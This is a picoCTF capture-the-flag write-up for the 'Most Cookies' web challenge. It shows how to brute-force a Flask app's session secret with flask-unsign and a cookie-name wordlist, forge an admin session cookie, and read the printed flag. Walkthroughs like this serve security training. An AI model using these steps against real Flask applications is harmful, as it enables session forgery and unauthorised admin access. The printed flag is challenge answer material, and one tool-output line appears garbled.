# Overview 
Category: [Web Exploitation]()

AUTHOR: MADSTACKS

# Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py)
http://mercury.picoctf.net:44693/

# Solution
- View server.py :
```python
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp
```
=> From this, it is clear we need to become admin to swipe that flag!

-  I found [flask-unsign](https://pypi.org/project/flask-unsign/), which is a tool that will help us uncover the secret key.
- Let's install flask-unsign.
```
$ pip3 install flask-unsign
```
- I enter a cookie "snickerdoodle" and receive cookies:
```
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zqpq_g.W7vzY-R8twyHc_ry9h6PTrZqmP4
```
- i decode the cookies : 
```
flask-unsign -d -c "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zqpq_g.W7vzY-R8twyHc_ry9h6PTrZqmP4"
{'very_auth': 'snickerdoodle'}
```
- Now let's continue to scroll down the flask-unsign website and we see "Unsigning (Brute Forcing Secret Keys)"
- I also made a wordlist.txt of the cookie names found in server.py (this will serve as my word list to brute force the secret key)
- FASTER WAY THAT I USED TO FIND THE SECRET KEY :
```
flask-unsign -u --server http://mercury.picoctf.net:44693/ --wordlist wordlist_cookies.txt
[*] Server returned HTTP 302 (FOUND)
[+] Successfully obtained session cookie: eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Zqpykg.6hXZiAAbzjX3ZewPzegDesahUJU
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'butter'
```
- Oh, the secret key!! In my case, it was 'butter'
- Continue Signing (Session Manipulation)
```
flask-unsign --sign --cookie "{'very_auth':'admin'}" --secret 'butter'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZqpzPA.qE-sogWrEANnECZjrI4-WS5S1N4
```
- Copy and paste cookie into the cookie value 
- Reload the page to receive flag
> Flag: **picoCTF{pwn_4ll_th3_cook1E5_dbfe90bf}**


## References
- wordlist.txt
```
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```